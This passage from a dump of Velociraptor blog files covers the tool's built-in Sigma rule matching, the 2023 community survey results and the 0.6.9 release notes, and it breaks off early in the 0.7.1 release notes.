This mapping is created using the VQL `sigma_log_sources()`
function. The function receives a list of log source names and their
corresponding VQL queries.

For example, consider the following definition:

```sql
LET LogSources <= sigma_log_sources(
  `*/windows/taskscheduler`={
         SELECT * FROM parse_evtx(
          filename=ROOT+"/Microsoft-Windows-TaskScheduler%4Operational.evtx")
  },
)
```

When Velociraptor encounters the Sigma rule above it will look for a
defined log source with `category=*, product=windows,
service=taskscheduler` forming the following key
`*/windows/taskscheduler`

The second mapping described above is between the rules mentioned in
the Sigma rule and the underlying fields in the actual
event. Velociraptor implements these mapping definitions via `VQL
Lambda` functions.

For example consider the following field mapping definitions:

```sql
LET FieldMapping <= dict(
  Path="x=>x.EventData.Path"
)
```

When Velociraptor attempts to evaluate a field mentioned in the Sigma
rule, the Velociraptor Sigma engine will pass the event to this lambda
function to resolve the actual field required. This allows us to
implement any translation operation between Sigma fields and data
based on the event itself - including more complex enrichment
operators (more on that later!).

After defining the log sources and field mapping, we are ready to
match Sigma rules using the `sigma()` [VQL
plugin](http://docs.velociraptor.app/vql_reference/misc/sigma/).

This plugin receives a number of arguments:

* `rules`: A list of sigma rules to compile and match.
* `log_sources`: A log source object as obtained from the
  `sigma_log_sources()` VQL function described above.
* `field_mapping`: A dict containing a mapping between a rule field
  name and a VQL Lambda to get the value of the field from the
  event.
* `debug`: If enabled we emit all match objects with description of
  what would match.
* `rule_filter`: If specified we use this callback to filter the rules
  for inclusion.Lambda
* `default_details`: If specified we use this callback to determine a
  details column if the sigma rule does not specify it.

For an example of a simple Sigma based artifact, See the
`Windows.Sigma.EventLogs` artifact

## Managing a large repository of Sigma rules

The previous section described how Sigma rule matching is implemented
in Velociraptor, but in practice we typically have a large number of
Sigma rules, perhaps imported from external sources.

There are some challenges with Sigma and some rules are not written
precisely enough to work in Velociraptor. For example, Sigma rules may
reference non-existent log sources, or unknown fields that do not
correspond to anything in the standard field mappings.

For this reason it is best to manage a large Sigma rule set using a
specialized tool `velosigmac`. You can find this tool at
https://sigma.velocidex.com or
https://github.com/Velocidex/velociraptor-sigma-rules

The repository already contains a large number of rules from the Sigma
project as well as [Hayabusa
rules](https://github.com/Yamato-Security/hayabusa-rules), but you can
also add your own rules.

The `velosigmac` tool is controlled via a config file specifying the
various log sources and field mappings, and produces a zip file
containing a Velociraptor artifact.

You can import the curated Sigma rules automatically by collecting the
`Server.Import.CuratedSigma` server artifact.

![Getting the Curated Sigma rules](getting_curated_rules.png)

Currently there are two types of curated artifacts:

1. A Curated ruleset based on the Hayabusa rules. This artifact is a
   regular CLIENT type artifact that can be used to scan all EVTX
   files on the endpoint for rules matches.
2. An Event based monitoring artifact that once installed follows all
   EVTX files to alert on Sigma rule matches in real time.


## Sigma alerting via a CLIENT artifact

Velociraptor is not the only tool that can apply Sigma rules to a live
system. Previously Velociraptor was integrated with
[Hayabusa](https://github.com/Yamato-Security/hayabusa),
[Chainsaw](https://github.com/WithSecureLabs/chainsaw) for quick
triage using Sigma rules.

The ability to triage a system efficiently using Sigma rules allows
first responders to quickly isolate the machines that need further
investigation. In this regard the Sigma rules do not have to be
perfect - they just need to indicate those machines requiring further
work.

By applying a standard set of Sigma signatures to a large numbers of
machines we can identify the interesting hosts quickly. An excellent
demonstration of this technique can be seen in the Video [Live
Incident Response with
Velociraptor](https://youtu.be/Q1IoGX--814?si=sRu1o7uAJqezjIwY&t=3858)
where Eric Capuano uses the Hayabusa tool deployed via Velociraptor to
quickly identify the attack techniques evident on the endpoint.

Now that Sigma is built into the Velociraptor engine itself, using
these signatures is much more efficient. Simple collect the artifact
imported earlier and collect it from the host in question, or start a
hunt for all hosts.

![Collecting sigma rules from the endpoint](collecting_sigma_rules.png)

The artifact has a number of configurable settings:
1. `RuleLevel` specifies which rules to include. Including lower level
   rules may detect interesting events but will also increase the
   false positive rate.
2. `RuleStatus` specifies which rule status to include - stable rules
   are more tested and less likely to produce false positives.

In the example below I collected `Critical and High` level rules. It
is instructive to see the query log:

![Query logs for Sigma collection](query_logs.png)

As can be seen the artifact selects 63 rules based on the Rule Level
and Status parameters. These rules end up referencing only 8 log
sources, so Velociraptor will only look at 8 log files - the largest
of these of these is the `System` log which contains 178k events.

Overall, Velociraptor found 81 hits on these Sigma rules in 57
seconds, and immediately we can see some critical information:

![Detecting critical level rules](detecting_critical_rules.png)

Let's select `All Rules` with a status of `Stable and Experimental`

![Query logs for Sigma collection with All Rules](query_logs_all.png)

This time, there are 1500 rules matching 41 different log sources. The
additional work required makes Velociraptor take 117 seconds now and
it returns over 62 thousand hits!


The number of hits is too large to manually review, so I typically
just want to know which rules were matched by stacking on the rule
Title:

```sql
SELECT * FROM source(artifact="Sigma.Windows.Hayabusa.Rules")
GROUP BY Title
```

This reduces the number of rows to 62. I can immediately see
interesting hits, even though they may be at low or informational
level.

![Detecting all rules in all levels](detecting_all_rules.png)


Typically for this type of collection, I tend to apply most of the
rules because I can post process the hits later on the server, but you
might want to collect only critical rules at first to reduce the
amount of work the Velociraptor client needs to perform.


Using Sigma rules for rapid triage is a particularly attractive
technique as shown above. Previously Velociraptor supported Sigma via
pushing and launching the Hayabusa tool to the endpoint, and
collecting the results from it.

So what advantages are there for natively supporting Sigma withing
Velociraptor?

1. By supporting the rules natively, we can control execution more
   closely. In particular, Velociraptor's CPU and memory controls can
   only work when Velociraptor itself is doing the work. By shelling
   out to an external tool we have no control over how many resources
   Hayabusa is using on the endpoint. Having Sigma as a built in
   capability allows Velociraptor to limit CPU utilization in order to
   minimize the impact on the endpoint.

2. Velociraptor is much more efficient than Hayabusa. Typically
   Velociraptor can match the same number of rules approximately 5
   times faster. However, the most important difference is the much
   reduced memory requirements. In my testing, Hayabusa typically uses
   about 1-2Gb of memory on the endpoint vs. about 200-300mb used by
   Velociraptor, making Hayabusa too risky to deploy very widely.

![Comparing Resource Consumption during Sigma rule matching](resource_consumption.png)

# Sigma alerting via real time monitoring artifacts

Velociraptor's VQL queries are streaming queries. This means they
deliver rows as soon as they become available, while the query itself
does not have to terminate. This facility is called [`Client
Monitoring` or `Event`
queries](https://docs.velociraptor.app/docs/client_monitoring/).

Since the built-in Sigma matching engine is also streaming and
asynchronous, it is also possible to use event queries for log
sources.

The `Velociraptor Hayabusa Live Detection` option in the Curated
import artifact will import an event monitoring version of the same
curated Sigma rules. I can configure the artifact in the usual way.

![Configuring the Monitoring Sigma detection artifact](configuring_monitoring.png)

This time the endpoint will forward detection events to the server in
real time.

![Live detection of Sigma rules](live_sigma_detection.png)

In the above I can see immediately suspicious use of `PSExec` in real
time!

# Conclusions

While Sigma itself is not a matching engine, it presents a convenient
abstraction over other matching engines. Integrating a Sigma matching
engine within Velociraptor allows users to add easy to read and
maintainable rules specifically designed for detection. The built in
Sigma matching engine is extremely fast while being built on top of
VQL.

This makes is flexible - it is possible to add arbitrary logs sources
from any VQL query. For example log sources based on ETW are already
in the works. This engine can efficiently match thousands of rules on
the endpoint, either in real time, or from historical sources.

Sigma presents a lot of opportunities to extend the detection
capabilities when running directly on the endpoint. Unlike using Sigma
as an interface to a SIEM where we are really at the mercy of the log
sources and fields that are forwarded by the collection agent and the
SIEM, Sigma rules on the endpoint can refer to any log source - be it
an event log or other more traditional sources of evidence, such as
Volatile information like process information, registry keys or
networking information.

---END OF FILE---

======
FILE: /content/blog/2023/2023-04-03-velociraptor-survey/_index.md
======
---
title: "The Velociraptor annual community survey"
description: |
   The Velociraptor development team is interested to hear about how the tool is used in the community in order to shape future development direction.

tags:
 - Community
author: "Mike Cohen"
date: 2023-04-01
---

Velociraptor is an open source project led and shaped by the
community. Over the years, Velociraptor has become a real force in the
field of DFIR making it the obvious choice for many operational
situations.

The Velociraptor development team is committed to continue making
Velociraptor the premier open source DFIR and security tool. We are
therefore interested to hear about how the tool is used in the
community and what the community expectations are in regard to
capabilities, features and use cases. We use this information in order
to shape future development direction, set priorities and develop our
road map.

In early 2023, the Velociraptor team distributed a community
survey which was very well received. We are grateful to the community
members who took the time to respond. As an open source project, we
depend on our community to contribute. There are many ways
contributors can help the project, from developing code, to filing
bugs or improving documentation. One of the most important ways users
can contribute is by providing valuable feedback through channels such
as this survey, to help shape the future road map and new features.

In this blog post I wanted to share some of the responses we received.

## Who are the Velociraptor Community?

Overall there were 213 responses. By far the majority of responders
were `Analysts` (57%) and `Managers` (26%) indicating that most of the
respondents are people who know and use Velociraptor frequently.

We wanted to get a feel for the type of companies using
Velociraptor. Users fell pretty evenly into company sizes, with about
30% of responses from small companies (less than 100 employees) and
20% of responses from very large companies of 10,000 employees or
more.

These companies also came from a wide range of industries. While many
were primarily in the information security fields such as Managed
Security Service Providers (MSSP), Consultants and Cybersecurity
businesses, we also saw a large number of responses from the
Government sector, the Aerospace industries, Education,
Banking/Finance, Health care, etc.

With such a wide range of users we were interested in how often users
were using Velociraptor. About a third of users use Velociraptor
frequently, a third use it occasionally and a third are in the process
of evaluating and learning about the tool.

## Velociraptor use cases

Velociraptor is a powerful tool with a wide feature set. We wanted to
glimpse an idea of what features were most popular and how users
prioritize these features. Specifically, we asked about the following
main use cases:

1. **Client monitoring and alerts (Detection).**

    Velociraptor can collect client event queries focused on
    detection. This allows the client to autonomously monitor the
    endpoint and send back high value events when certain conditions
    are met.

    12% of users were actively using this feature to monitor the end
    point.

2. **Proactively hunt for indicators (Threat intelligence)**

    Velociraptor's unique ability to collect artifacts at scale from
    many system can be combined with threat intelligence information
    (such as hashes, etc.) to proactively hunt for compromises by known
    actors. This question was specifically related to hunting for threat
    feed indicators, such as hashes, IP addresses etc.

    16% of users were utilizing this feature

3. **Ongoing forwarding of events to another system**

    Velociraptor's client monitoring queries can be used to simply
    forward events (such as ETW feeds).

    6% of users were utilizing this feature

4. **Collecting bulk files for analysis on another system (Digital
   Forensics)**

   Velociraptor can be used to collect bulk files from the endpoint
   for later analysis by other tools (for example using the
   `Windows.Collection.KapeFiles` artifact).

   20% of users were using this feature regularly.

5. **Parse for indicators on the endpoint (Digital Forensics)**

   Velociraptor's artifacts are used to directly parse files on the
   endpoint, returning actionable high value information quickly
   without the need for lengthy post processing.

   21% of users use these types of queries.

6. **Proactive hunt for indicators across many systems (Incident
   Response)**

   Velociraptor can hunt for artifacts from many endpoints at once.

   21% of users use this capability.

We further asked for the relative importance of these features.

Users valued most the ability to collect bulk files and hunting for
artifacts across many systems, followed by the ability to parse
artifacts directly on the endpoints.

## Backwards compatibility

As developers we need to understand how important backwards
compatibility is to users so we can develop effective update
procedures.

Some users deployed Velociraptor for limited time engagements so they
did not need backwards compatibility for stored data as they wouldn't be
upgrading to major versions within the same deployment.

Other users required more stable data migration but were generally
happy with removing data compatibility if necessary. For example, with
one response stating "I would rather you prioritize improvements over
compatibility even if it breaks things."

Another user explained: "In a typical Incident Response scenario,
Digital Forensics data has a shelf life of a few weeks or months at
best and I am comfortable with the convertibility and portability of
much of the data that Velociraptor collects such that archival data
can still be worked with even if newer versions of the server no
longer support a deprecated format/archive. Just saying that I think
there will be workarounds if this becomes an issue for folks with
mountains of legacy data that hasn’t been exported somewhere more
meaningful for longer term storage and historical data
analytic/intelligence purposes."

Generally most users indicated they rarely or never needed to go back
to archived data and re-analyze.

## Version compatibility

The Velociraptor [support
policy](https://docs.velociraptor.app/docs/overview/support/)
officially only supports clients and servers on the same release
version. However in reality it usually takes longer to upgrade clients
than servers. While some users are able to upgrade clients promptly,
many users estimate between 10-50% of deployed clients are a version
older than the server.

The Velociraptor team therefore needs to maintain some compatibility
with older clients to allow time for users to upgrade their endpoints.

## The offline collector

The offline collector is a way to use Velociraptor's artifacts without
needing to deploy a server. This feature is used mainly when we need
to rely on another party to run the actual collection or we are not
able to deploy a new agent on the endpoint.

This feature is used exclusively by about 10% of users, while a
further 30% of users use it frequently. It is an important feature for
Velociraptor and the Velociraptor team should devote more time to
making this even more seamless and easy to use.

Most users of the offline collection deploy it manually (50%), while
deploying via another EDR tool, or via Group Policy are also robust
options. Some users have created custom wrappers to deploy the offline
collector in the field.

The Offline collection supports directly uploading the collection to a
cloud server using a number of methods.

The most popular upload method is to an `AWS S3 bucket` (30%) while
the `SFTP connector` in the cloud or a `custom SFTP server` on a VM
are also popular options (20% and 23%). Uploading directly to `Google
Cloud Storage` is the least popular option at about 5%.

Manual copy methods were also popular ranging from EDR based copying
to Zoom file copy.

A commonly requested method was `Azure blob storage` which
Velociraptor currently does not support. Many responses indicate that
`SFTP` is currently a workaround to the lack of direct Azure
support. The Velociraptor team should prioritize supporting Azure blob
storage.

## Data analysis

Velociraptor supports collecting raw files (e.g. Event log files,
`$MFT` etc) for analysis in other tools. Alternatively Velociraptor
already contains extensive parsers for most forensic artifacts that
can be used directly on the endpoint.

Most users do use the built in forensic parsing and analysis artifacts
(55%) but many users also collect raw files (e.g. via the
`Windows.Collection.KapeFiles` artifact).

## VQL artifacts

Velociraptor uses the Velociraptor Query Language to perform
collections and analysis. The VQL is usually shared via an `Artifact`
with the community.

Most users utilize the built in artifacts as well as the [artifact
exchange](https://docs.velociraptor.app/exchange/). A significant
number of users also develop their own artifacts for their own
use. Over 60% of users report that they develop their own artifacts.

For those users who develop their own artifacts, we asked about
limitations and difficulties in this process. A common theme that
arose was around debugging artifacts and the lack of a VQL debugger
and better error reporting.

Training and documentation was also pointed as needing improvements. A
suggestion was made to enhance documentation with a lot more examples
of how each VQL plugin can be used in practice.

Luckily the Velociraptor team is running a training course at
[BlackHat 2023](https://www.blackhat.com/us-23/training/schedule/#digging-deeper-with-velociraptor-30129)
this year so users can learn from the Velociraptor developers detailed information of how to deploy Velociraptor and write effective custom VQL.

## Role based access controls

Velociraptor is a very powerful tool and concentrates a lot of
responsibility in the hands of a few users. To control access to the
tool, Velociraptor has a role based access control mechanism, where
users can be assigned roles from `administrator`, `investigator` to
read-only access provided by the `reader` role.

Users generally found this feature very useful, with 40% of users
finding it `moderately useful` and a further 20% and 15% further
finding it `very useful` and `extremely useful`, respectively.

The main suggestions for improvements include:

1. Easier management through the GUI (as of version 0.6.8 all user
   ACLs are managed through the GUI now).
2. Custom roles with more granular permissions.
3. Better logging and auditing.
4. Some way to allow a specific role to only run a pre-approved subset
   of artifacts. Some way to only run signed/hashed VQL - prevent a
   malicious artifact being dropped on the server.
5. Making it clearer what each permission grants the user.

## Multi-tenant support

In recent versions, Velociraptor offers a fully multi-tenanted mode,
where organizations can be created and destroyed quickly with minimal
resource overheads. This feature is used by 25% of respondents, who
are mainly consultants using it to separate out different
customers. Some companies use multi-tenancies to separate out different
organizations in the same business or subsidiaries.

## Client monitoring and alerting

Velociraptor can run `event queries` on the client. These VQL queries
run continuously and stream results to the server when certain
conditions are met. A common use case for these is to generate alerts
and for enhanced detection.

Some users deploy client monitoring artifacts frequently while others
see it as an alternative to EDR tools, when these are available. The
primary use case breakdown was:

1. Detection (e.g. alert when an anomalous event occurs) - 27% of users
2. Collection of client events (e.g. forward process event logs to an
   external system) - 18% of users
3. Remediation (e.g. quarantine or remove files automatically) - 15% of users

While 30% of users do not use client monitoring at all.

The main pain point with client monitoring seems to be the lack of
integrated alerting capability (an [issue currently being worked
on](https://github.com/Velocidex/velociraptor/issues/1869)). Some
useful feedback on this feature included:

* Better support for integration with business tools - e.g., Teams,
  Slack, etc.
* Easier to manage event data.
* Not having to build a server side artifact for each client_event
  artifact. And a dashboard that lists all alerts. Also, an easier
  way to forward alerts based on severity.
* Lack of pre-built detection rules / packs. In other words, it would
  be easier to tune down, than to build up.

## The Quarantine feature

Velociraptor can quarantine an endpoint by collecting the
`Windows.Remediation.Quarantine` artifact. This artifact tunes the
firewall rules on the endpoint to block all external network
communication while maintaining connectivity to the Velociraptor
host. This allows for an endpoint to be isolated during
investigation.

The feature was "sometimes used" by about 30% of users and "always used"
by 12%, making it a popular feature.

## How is Velociraptor deployed?

Velociraptor is a very light weight solution, typically taking a few
minutes to provision a new deployment. For many of our users,
Velociraptor is used in an Incident Response context on an as-needed
basis (46%). Other users prefer a more permanent deployment (25%).

For larger environments, Velociraptor also supports multi-server
configuration (used by 13% of users), while the more traditional
single server deployment option is used by 70% of users.

While some users deploy very short lived deployments of several days
or less (13%), most users keep their deployment for several weeks
(27%) to months or permanently (44% of users).

Velociraptor is designed to work efficiently with many end points. We
recommend a maximum of 15-20k endpoints on a single server before
switching to a multi-server architecture (although users reported
success with larger deployment sizes on a single server). This level
of performance is adequate in practice for the majority of users.

Many users run deployments of less than 250 endpoints (44%) while a
further 40% of users deploy to less than 5,000 endpoints.

Approximately 10% of users have deployment sizes larger than 25,000
endpoints with 2% of users over 100,000 endpoints.

## Popular operating systems

Among Velociraptor's supported operating systems, Windows 64-bit, is
the most popular (with 82% of users ranking it the most deployed OS
type), while Linux is the next most popular deployed endpoint OS (26%
ranked second, and 48% third). Finally, Mac is the third popular choice
for Velociraptor's users, with 32-bit Windows systems still very
prevalent.

## Resources and references

Velociraptor's web site at https://docs.velociraptor.app/ contains a
wealth of reference material, training courses and presentations. We
also have an active YouTube channel (https://www.youtube.com/@velocidexenterprises8702) with many instructional videos.

While some users ranked the website as `Extremely Useful` (25%) there
is clearly room for improvements with 42% of users only rating it as
`Very Useful` or `Moderately Useful` (28%).

Suggestions for improvements included:

* More in-depth YouTube videos breaking down the tool's features with
  workflows.
* More detailed "how to" with practical examples.
* Improved documentation about functions and plugins with a
  slightly more detailed explanation and a small example.
* Documents seem to be outdated, would like to see updates to the
  documentation to reflect the new versions and features.

## Testimonials

Finally I wanted to share with you some of the testimonials that users
wrote in the survey. We are humbled with the encouraging and positive
words we read, and are excited to be making an impact on the DFIR
field.

* I have to congratulate you and thank you for developing such an
  amazing tool. It's the future of DFIR. I hope Rapid7 won't make it
  very expensive in the future.

* Awesome product, can't wait to use it in prod!

* This is a game changer for the DFIR industry. Keep up the great work.

* Keep the file system based back end, its simplicity makes chain of
  custody/court submissions possible.

* I thoroughly love Velociraptor. The team and community are absolutely
  fantastic. I would go as far as to say that Mike and Matthew Green
  are my favorite infosec gentlemen in the industry.

* Y'all are awesome. I feel like I was pretty critical but that's
  because this is an amazing software, and want to see it continue to
  grow and improve.

* We have been deploying Velociraptor to client environments almost
  since it was released. Our DFIR business model is entirely centered
  around it and it works very well for us. It is a great solution that
  just keeps getting better and better

## Conclusions

This is our first Velociraptor community survey, and it has proven to
be extremely useful. Since Velociraptor is a community-led open source
project, we need an open feedback loop to our users, to understand
where things need to be improved and what features should be
prioritized.

At the same time, since Velociraptor is an open source project, I hope
this survey will inspire contributions from the community. We value
all contributions, from code to documentation, testing and bug reports.

Finally for all our US based users, we hope to see you all in person
at [BlackHat 2023](https://www.blackhat.com/us-23/training/schedule/#digging-deeper-with-velociraptor-30129) this year! Join us for an in depth Velociraptor
training and to geek out with VQL for 4 days, learning practical,
actionable skills and supporting this open source project.

---END OF FILE---

======
FILE: /content/blog/2023/2023-05-05-release-notes-0.6.9/_index.md
======
---
title: "Velociraptor 0.6.9 Release"
description: |
   Velociraptor Release 0.6.9 is now LIVE!
   This post discusses some of the new features.

tags:
 - Release

author: "Mike Cohen"
date: 2023-05-05
---

I am very excited to announce the latest Velociraptor release 0.6.9 is
now LIVE and available for download. This release has
been in the making for a few months now and has a lot of new features
and bug fixes.

In this post I will discuss some of the interesting new features.

## GUI improvements

The GUI was updated in this release to improve user workflow and accessibility.

### Table filtering and sorting

Previously, table filtering and sorting required a separate dialog. In
this release the filtering controls were moved to the header of each
column making it more natural to use.

![Filtering tables.](filtering_tables.png)

### VFS GUI improvements

The VFS UI allows the user to collect files from the endpoint in a
familiar tree based user interface. In previous versions it was only
possible to schedule a single download at a time. This proved
problematic when the client was offline or transferring a large file
because the user had no way to kick off the next download until the
first file was fully fetched.

In this release the GUI was revamped to support multiple file
downloads at the same time. Additionally it is now possible to
schedule a file download by right clicking the download column in the
file table and selecting "Download from client".

![Initiating file download in the VFS. Note multiple files can be scheduled at the same time, and the bottom details pane can be closed](downloading_file.png)

### Hex viewer and file previewer GUI

In release 0.6.9 a new hex viewer was introduced. This viewer makes it
possible to quickly triage uploaded files from the GUI itself,
implementing some common features:

1. The file can be viewed as a hex dump or a strings style output.
2. The viewer can go to an arbitrary offset within the file, or page
   forward or backwards.
3. The viewer can search forward or backwards in the file for a
   `Regular Expression`, `String`, or a `Hex String`.

The hex viewer previewer is available for artifacts that define a
column of type `preview_uploads` including the `File Upload` table
within the flow GUI.

![The hex viewer UI can be used to quickly inspect an uploaded file](hex_viewer.png)

### Artifact pack import GUI improvements

Velociraptor allows uploading an `artifact pack` - a simple Zip file
containing artifact definitions. For example, the artifact exchange is
simply a zip file with artifact definitions.

Previously artifact packs could only be uploaded in their entirety and
always had an "Exchange" prefix prepended. However in this release the
UI was revamped to allow only some artifacts to be imported from the
pack and customize the prefix.

![It is now possible to import only some of the artifacts in a pack](import_pack.png)


## Direct SMB support

Windows file sharing is implemented over the SMB protocol. Within the
OS, accessing remote file shares happens transparently, for example by
mapping the remote share to a drive using `net use` command or
accessing a file name starting with a UNC path
(e.g. `\\ServerName\Share\File.exe`).

While Velociraptor can technically also access UNC shares by using the
usual file APIs and providing a UNC path, in reality this does not
work because Velociraptor is running as the local `System` user which
normally does not have network credentials so it can not map remote
shares.

This limitation is problematic because sometimes we need to access
remote shares (e.g. to verify hashes, perform yara scans etc). Until
this release the only workaround for this limitation was to install
the Velociraptor user as a domain user account with credentials.

As of the 0.6.9 release SMB is supported directly within the
Velociraptor binary as an accessor. This means that all plugins that
normally operate on files can also operate on a remote SMB share
transparently. Velociraptor does not rely on the OS to provide
credentials to the remote share, instead credentials can be passed
directly to the `smb` accessor to access the relevant `smb` server.

The new accessor can be used in any VQL that needs to use a file, but
to make it easier there is a new artifact called the
`Windows.Search.SMBFileFinder` artifact that allows for flexible file
searches on an SMB share.

![Searching a remote SMB share](smb_file_search.png)

### Using SMB for distributing tools

Velociraptor can manage third party tools within its collected
artifacts by instructing the endpoint to download the tool from an
external server or the velociraptor server itself.

It is sometimes convenient to download external tools from an external
server (e.g. a cloud bucket) due to bandwidth considerations.

Previously this server could only be a HTTP server, but in many
deployments it is actually simpler to download external tools from an
SMB share.

In this release Velociraptor accepts an SMB URL as the serve URL
parameter within the tool configuration screen.

![Serving a third party tool from an SMB server](tool_serving_by_smb.png)

You can configure the remote share with read only permissions (read
[these instructions]({{% ref
"/docs/offline_triage/remote_uploads/#smb-share" %}}) for more details
on configuring SMB).

## The offline collector

The offline collector is a popular mode of running Velociraptor, where
the artifacts to collect are pre-programmed into the collector which
stores the results in a zip file. The offline collector can be
pre-configured to encrypt and upload the collection automatically to
a remote server without user interaction, making it ideal for using
remote agents or people to manually run the collector without needing
further training.

In this release the Velociraptor offline collector added two more
upload targets. It is now possible to upload to an SMB server and to
Azure Blob Storage.

### SMB server uploads

Because the offline collector is typically used to collect large
volumes of data, it is beneficial to upload the data to a networked
server close to the collected machine. This avoids cloud network costs
and bandwidth limitations and works very well in air gapped networks.

You can now simply create a new share on any machine, by adding a
local Windows user with password credentials, exporting a directory as
a share and adjusting the upload user's permissions to only be able to
write on the share and not read from it. It is now safe to embed these
credentials in the offline collector - which can only upload data but
not read or delete other data.

See the full instructions of how to [configure the offline collector for SMB upload]({{% ref
"/docs/offline_triage/remote_uploads/#smb-share" %}}).

### Azure Blob storage service.

Velociraptor can also upload collections to an Amazon S3 or Google
Cloud Storage bucket. However until now, Velociraptor did not support
the Azure offering. Many users requested direct support for Azure blob
storage, which is now in 0.6.9.

See this for all [The details about how to configure Azure for safe
uploads]({{% ref
"/docs/offline_triage/remote_uploads/#azure-blob-storage" %}}), but
similar to the other methods, credentials embedded in the offline
collector can only be used to upload data and not read or delete data
in the storage account.

## Debugging VQL queries

One of the points of feedback we received from our annual user survey
was that although VQL is an extremely powerful language, users
struggled with debugging and understanding how the query
proceeds. Unlike a more traditional programming language
(e.g. Python), there is no debugger where users can pause execution
and inspect variables, or add print statements to see what data is
passed between parts of the query.

We took this feedback on board and in release 0.6.9 the `EXPLAIN`
keyword was introduced. The `EXPLAIN` keyword can be added before any
SELECT in the VQL statement to place that SELECT statement into
tracing mode.

As a recap the general syntax of the VQL statement is:

```vql
SELECT vql_fun(X=1, Y=2), Foo, Bar
FROM plugin(A=1, B=2)
WHERE X = 1
```

When a query is in tracing mode:

1. All rows emitted from the plugin are logged with their types
2. All parameters into any function are also logged
3. When a row is filtered because it did not pass the `WHERE` clause this is also logged

This additional tracing information can be used to understand how data
flows throughout the query.

![Explaining a query reveals details information on how the VQL engine handles data flows](explaining_a_query.png)

You can use the `EXPLAIN` statement in a notebook or within an
artifact as collected from the endpoint (although be aware that it can
lead to extremely verbose logging).

![Inspect the details by clicking on the logs button](explaining_a_query_2.png)

For example in the above query we can see:
1. The `clients()` plugin generates a row.
2. The `timestamp()` function received the `last_seen_at` value
3. The `WHERE` condition rejected the row because the `last_seen_at` time was more than 60 seconds ago.

## Locking down the server

Another concern raised in our survey was the perceived risk of having
Velociraptor permanently installed. Due to its high privilege and
efficient scaling there is a risk that a Velociraptor administrator
account compromise can be escalated to compromise the entire domain.

While this risk is not higher than any other domain wide
administration tool, in some deployment scenarios, Velociraptor does
not need this level of access normally. While in an incident response
situation, it is necessary to promote Velociraptor's level of access
easily.

In the 0.6.9 release, Velociraptor has introduced `lock down
mode`. When a server is locked down certain permissions are removed
(even from administrators). The lockdown is set in the config file,
helping to mitigate the risk of a Velociraptor server admin account
compromise.

After initial deployment and configuration, the administrator can set
the server in lockdown by adding the following configuration
directive to the `server.config.yaml` and restarting the server:

```yaml
lockdown: true
```

After the server is restarted the following permissions will be denied:

 - `ARTIFACT_WRITER`
 - `SERVER_ARTIFACT_WRITER`
 - `COLLECT_CLIENT`
 - `COLLECT_SERVER`
 - `EXECVE`
 - `SERVER_ADMIN`
 - `FILESYSTEM_WRITE`
 - `FILESYSTEM_READ`
 - `MACHINE_STATE`

Therefore it will still be possible to read existing collections, and
continue collecting client monitoring data but not edit artifacts or
start new hunts or collections.

During an active IR the server may be taken out of lockdown by
removing the directive from the configuration file and restarting the
service. Usually the configuration file is only writable by root and
the Velociraptor server process is running as a low privilege account
which can not write to the config file. This combination makes it
difficult for a compromised Velociraptor administrator account to
remove the lockdown and use Velociraptor as a lateral movement
vehicle.

## Audit events

Velociraptor maintains a number of log files over its operation,
normally stored in the `<filestore>/logs` directory. While the logs
are rotated and separated into different levels, the most important
log type is the `audit` log which records auditable events. Within
Velociraptor `auditable events` are security critical events such as:

- Starting a new collections from a client
- Creating a new hunt
- Modifying an artifact
- Updating the client monitoring configuration

Previous versions of Velociraptor simply wrote those events to the
logging directory but this can be deleted if the server becomes
compromised.

In 0.6.9 there are two ways to forward auditable events off the server

1. Using [remote syslog services]({{% ref "/docs/deployment/references/#Logging.remote_syslog_server" %}})
2. Uploading to external log management systems e.g. Opensearch/Elastic using the [Elastic.Events.Upload]({{% ref "/artifact_references/pages/elastic.events.upload.html" %}}) artifact.

Additionally,  auditable events are now emitted as part of the
`Server.Audit.Logs` artifact so they can be viewed or searched in the
GUI by any user.

![The server's audit log is linked from the Welcome page](inspecting_audit_log.png)

![Inspecting user activity through the audit log](inspecting_audit_log_2.png)

Because audit events are available now as part of the server
monitoring artifact, it is possible for users to develop custom VQL
server monitoring artifacts to forward or respond to auditable events
just like any other event on the client or the server. This makes it
possible to forward events (e.g. to Slack or Discord) as demonstrated
by the `Elastic.Events.Upload` artifact above.

## Tool definitions can now specify an expected hash

Velociraptor supports pushing tools to external endpoints. A
Velociraptor artifact can define an external tool, allowing the server
to automatically fetch the tool and upload it to the endpoint.

Previously the artifact could only specify the URL where the tool
should be downloaded from. However in this release it is also possible
to declare the expected hash of the tool. This prevents potential
substitution attacks effectively by pinning the third-party binary
hash.

While sometimes the upstream file may legitimately change (e.g. due to
a patch), Velociraptor will not automatically accept the new file when
the hash does not match the expected hash.

![Mismatched hash](tool_hash_mismatch.png)

In the above I modified the expected hash to be slightly different
from the real tool hash. Velociraptor refuses to import the binary but
provides a button allowing the user to accept this new hash
instead. This should only be done if the administrator is convinced
the tool hash was legitimately updated.

## Conclusions

There are many more new features and bug fixes in the latest
release. 

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

If you want to master Velociraptor, consider joining us at the full
Velociraptor training course held this year at the Blackhat
Conference and delivered by the Velociraptor developers themselves.

Details here:
https://docs.velociraptor.app/announcements/2023-trainings/

---END OF FILE---

======
FILE: /content/blog/2023/2023-11-15-release-notes-0.7.1/_index.md
======
---
title: "Velociraptor 0.7.1 Release"
description: |
   Velociraptor Release 0.7.1 is now LIVE!
   This post discusses some of the new features.

tags:
 - Release

author: "Mike Cohen"
date: 2023-11-15
---

I am very excited to announce that the latest Velociraptor release 0.7.1 is
now LIVE!

In this post I will discuss some of the interesting new features.

## GUI improvements

The GUI was updated in this release to improve user workflow and accessibility.

### Notebook improvements

Velociraptor uses `notebooks` extensively to facilitate collaboration,
and post processing. There are currently three types of notebooks:

1. Global Notebooks - these are available from the GUI sidebar and can
   be shared with other users for a collaborative workflow.
2. Collection notebooks - these are attached to specific collections
   and allow post processing the collection results.
3. Hunt notebooks - are attached to a hunt and allow post processing
   of the collection data from a hunt.

This release further develops the `Global notebooks` workflow as a
central place for collecting and sharing analysis results.

#### Templated notebooks

Many users use notebooks heavily to organize their investigation and
guide users on what to collect. While `Collection notebooks` and `Hunt
notebooks` can already include templates there was no way to customize
the default `Global notebook`.

In this release, we define a new type of Artifact of type `NOTEBOOK`
which allows a user to define a template for global notebooks.

In this example I will create such a template to help users gather
server information about clients. I click on the artifact editor in
